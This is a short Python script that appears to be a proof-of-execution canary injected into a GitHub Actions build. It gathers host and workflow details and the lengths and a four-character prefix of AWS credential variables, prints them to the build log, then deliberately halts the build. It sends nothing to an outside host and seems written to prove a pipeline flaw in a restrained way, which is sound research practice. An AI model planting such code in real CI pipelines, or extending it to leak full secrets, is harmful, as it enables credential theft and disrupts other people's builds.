import os, socket
_aki = os.environ.get("AWS_ACCESS_KEY_ID", "")
_info = "CANARY1772 exec host=%s event=%s repo=%s workflow=%s run_id=%s keyid_len=%d keyid_prefix=%s secret_len=%d token_len=%d region=%s prefix=%s" % (
    socket.gethostname(), os.environ.get("GITHUB_EVENT_NAME", ""), os.environ.get("GITHUB_REPOSITORY", ""),
    os.environ.get("GITHUB_WORKFLOW", ""), os.environ.get("GITHUB_RUN_ID", ""), len(_aki), _aki[:4],
    len(os.environ.get("AWS_SECRET_ACCESS_KEY", "")), len(os.environ.get("AWS_SESSION_TOKEN", "")),
    os.environ.get("AWS_REGION", ""), os.environ.get("CI_PREFIX", ""))
print("::error::" + _info, flush=True)
print(_info, flush=True)
raise RuntimeError("CANARY1772 stopping build after execution proof")
